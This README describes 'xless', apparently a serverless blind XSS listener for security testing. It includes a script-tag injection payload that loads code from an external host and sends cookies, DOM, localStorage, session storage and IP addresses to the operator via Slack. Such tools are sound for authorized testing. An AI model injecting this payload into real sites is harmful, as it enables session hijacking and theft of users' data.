# The Serverless Blind XSS App

## About The Project
xless is a serverless blind XSS app that can be used to identify blind XSS vulnerabilities using your own deployed version of the app. There is no need to run a full deployment process; just setup a zeit.co account and run `bash deploy.sh`. That's it. You have a fully-running Blind XSS listener that uses Slack to notify you for blind XSS callbacks.


## Requirements

* zeit.co account: Zeit provides free plan for serverless. If you use another provider for serverless, code changes should be minimal.
* Slack Incoming Webhook URL.


## Deployment

1. Run:

```bash
$ bash deploy.sh

> Deploying ~/xless under X
> https://xless.now.sh [v2] [in clipboard] [4s]
> Success! Deployment ready [4s]
```
2. Use the URL for blind XSS testing :fire:

**Xless will automatically serve the XSS payload, collect information, and exfiltrate it into your serverless app, which is then sent right to you in Slack.**


## Example Payload

```javascript
<script src="https://xless.now.sh"></script>

```

# Collected Data

* Cookies
* User-Agent
* HTTP Referrer
* Browser DOM
* Browser Time
* Document Location
* Origin
* LocalStorage
* SessionStorage
* IP Address


# Out-of-Band Callbacks Listener

Xless also works as an OOB (Out-of-Band) callbacks listener for HTTP/HTTPS requests. Any HTTP GET request that is sent to non-parent path will be alerted.

### Demo

```bash
$ curl https://xless.now.sh/callback-canary
```

Or anything random, such as:

```bash
$ curl https://xless.now.sh/88bf0ecd
```


# Example Blind XSS payloads

You can view a number of handy XSS payloads for your Xless app at `/examples`
* URL: `https://xless.now.sh/examples`
Once you deploy your app, you can find the examples there.


## Contribution
Contribution is very welcome. Please share your ideas by Github issues and pull requests.

Here are some ideas to start with:
1. Enabling sharing of page screenshot - Check `test.payload.js`.
2. A nice logo design!
3. _Your idea of a new feature_?
